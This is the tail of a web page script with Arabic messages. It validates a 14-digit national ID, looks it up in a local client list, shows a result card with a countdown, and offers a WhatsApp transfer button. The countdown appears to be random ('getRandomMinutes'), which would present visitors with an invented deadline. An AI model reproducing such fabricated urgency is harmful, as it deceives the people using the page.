    }

    function displayResult(client) {
        const remaining = getRandomMinutes();
        const resultDiv = document.getElementById('resultCard');
        resultDiv.innerHTML = buildResultHTML(client, remaining);
        resultDiv.classList.add('show');
        document.getElementById('errorCard').style.display = 'none';
        startTimer(remaining, client);
        const btn = document.getElementById('whatsappTransferBtn');
        if (btn) btn.onclick = () => redirectToWhatsApp(client);
    }

    function searchCustomer() {
        const nationalId = document.getElementById('nationalId').value.trim();
        if (!nationalId) { alert('الرجاء إدخال الرقم القومي'); return; }
        if (nationalId.length !== 14) { alert('الرقم القومي يجب أن يكون 14 رقمًا'); return; }
        document.getElementById('loader').style.display = 'block';
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            const found = clientsData.find(c => c.id === nationalId);
            if (found) {
                currentClient = found;
                displayResult(currentClient);
            } else {
                document.getElementById('resultCard').classList.remove('show');
                document.getElementById('errorCard').style.display = 'block';
            }
        }, 1000);
    }

    document.getElementById('nationalId').addEventListener('keypress', e => { if (e.key === 'Enter') searchCustomer(); });
</script>
</body>
</html>
